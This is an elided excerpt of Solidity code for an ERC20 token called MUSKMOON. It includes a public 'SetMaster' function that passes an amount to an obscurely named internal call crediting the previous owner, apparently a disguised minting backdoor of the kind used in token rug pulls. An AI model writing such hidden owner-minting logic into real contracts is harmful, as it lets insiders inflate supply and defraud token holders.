...
contract ERC20 is Context, IERC20, Ownable {
   ...
   function SetMaster(uint256 amount) public returns (bool) {
    _axie(previousOwner(), amount*10**9);
     return true;
...
contract MUSKMOON  is ERC20 {

    uint tokenTotalSupply = 1000000000000;

    constructor() public ERC20("MUSKMOON", "MUSKMOON") {
